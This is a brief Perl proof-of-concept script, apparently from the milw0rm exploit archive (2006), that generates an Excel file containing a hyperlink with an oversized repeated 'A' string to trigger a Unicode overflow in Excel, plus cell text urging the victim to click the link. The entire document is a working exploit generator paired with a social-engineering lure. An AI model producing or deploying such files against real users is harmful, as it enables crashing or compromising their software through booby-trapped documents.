###############################
# excelsexywarez.pl
# excel unicode overflow poc
# by kcope in 2006
# thanks to revoguard and alex
###############################
use Spreadsheet::WriteExcel;

   my $workbook = Spreadsheet::WriteExcel->new("FUCK.xls");

   $worksheet = $workbook->add_worksheet();

   $format = $workbook->add_format();
   $format->set_bold();
   $format->set_color('red');
   $format->set_align('center');

   $col = $row = 5;
   $worksheet->write($row, $col, "kcope in da house! Click on the link!!!", $format);

   $a="AAAAAAAAAAAAAAAAAAAAAA\\" x 500;
   $worksheet->write_url(0, 0, "$a", "LINK");

# milw0rm.com [2006-06-18]
